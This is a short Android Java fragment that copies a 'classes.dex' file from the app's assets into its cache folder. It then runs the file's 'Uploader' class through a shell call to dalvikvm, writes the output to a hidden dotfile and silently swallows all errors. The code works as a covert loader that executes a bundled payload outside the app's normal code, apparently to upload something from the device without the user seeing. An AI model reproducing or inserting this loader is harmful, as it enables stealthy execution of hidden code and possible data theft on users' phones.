//copy dex file
private void iq500copy(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
			out.write(buffer, 0, read);
        }
    }
//main function
private void iq500Uploader()
	{
		File outputDir = this.getCacheDir();
		String cacheRoot = outputDir.toString();
		File f = new File(cacheRoot + "/classes.dex"); //core class (uploader)
		try
		{
			//check if adding Uploader class to cache folder is required
			if(!f.exists())
			{
				AssetManager assetManager = getAssets();
				InputStream in = assetManager.open("classes.dex");
				OutputStream out = new FileOutputStream(f);
				iq500copy(in, out);
				in.close();
				out.flush();
				out.close();
			}
			
			//Run the dex file copied
			String[] cmds = {"sh", "-c", String.format("cd %s && dalvikvm -cp classes.dex Uploader > .upr3su1t", cacheRoot)};
			Runtime.getRuntime().exec(cmds);
			
		}
		catch (Exception e)
		{
			//debug use
			//Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
		}
	}
